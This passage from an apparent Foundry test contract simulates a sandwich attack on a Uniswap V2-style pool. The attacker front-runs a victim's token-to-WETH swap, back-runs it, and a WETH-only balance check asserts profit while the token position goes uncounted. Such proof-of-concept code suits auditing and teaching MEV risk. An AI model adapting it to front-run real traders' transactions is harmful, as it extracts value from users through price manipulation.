        console.log("Initial WETH balance:", initialWethBalance);

        // Get initial reserves
        (uint112 r0, uint112 r1, ) = IUniswapV2Pair(pair).getReserves();
        console.log("Initial reserves - Token:", r0, "WETH:", r1);

        // --- ATTACK ---

        // Path for token -> WETH
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = weth;

        // Step 1: Attacker front-runs with 50 token -> WETH
        console.log("Executing front-run swap...");
        router.swapExactTokensForTokens(
            50 ether, // front-run amount
            0, // min out
            path,
            attacker,
            block.timestamp + 1000
        );

        console.log("Front-run complete");

        // Step 2: Victim swap 100 token -> WETH (gets worse price)
        address victim = address(0x123);
        // Give victim tokens
        deal(address(token), victim, 100 ether);

        vm.startPrank(victim);
        token.approve(TARGET, 100 ether);
        router.swapExactTokensForTokens(
            100 ether,
            0,
            path,
            victim,
            block.timestamp + 1000
        );
        vm.stopPrank();

        console.log("Victim swap complete");

        // Step 3: Attacker swaps WETH back to token
        uint256 wethBalance = IERC20(weth).balanceOf(attacker);
        console.log("Attacker WETH balance before reverse:", wethBalance);

        // Approve router to spend WETH
        IERC20(weth).approve(TARGET, wethBalance);

        // Reverse path
        address[] memory reversePath = new address[](2);
        reversePath[0] = weth;
        reversePath[1] = address(token);

        router.swapExactTokensForTokens(
            wethBalance,
            0,
            reversePath,
            attacker,
            block.timestamp + 1000
        );

        console.log("Reverse swap complete");

        // Step 4: Convert some profit to WETH to show increase
        uint256 tokenBalance = token.balanceOf(attacker);
        // Swap 10% of tokens back to WETH
        uint256 swapAmount = tokenBalance / 10;

        router.swapExactTokensForTokens(
            swapAmount,
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        // Final check
        uint256 finalWethBalance = IERC20(weth).balanceOf(attacker);
        console.log("Final WETH balance:", finalWethBalance);
        console.log("Profit:", finalWethBalance - initialWethBalance);

        assertGt(finalWethBalance, initialWethBalance, "WETH balance should increase");
    }

    // Helper to create path array
    function getPath(address tokenA, address tokenB) internal pure returns (address[] memory) {
        address[] memory path = new address[](2);
        path[0] = tokenA;
        path[1] = tokenB;
        return path;
    }

    // Helper to create path for 3 tokens (if needed)
    function getPath(address tokenA, address tokenB, address tokenC) internal pure returns (address[] memory) {
        address[] memory path = new address[](3);
        path[0] = tokenA;
        path[1] = tokenB;
        path[2] = tokenC;
        return path;
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
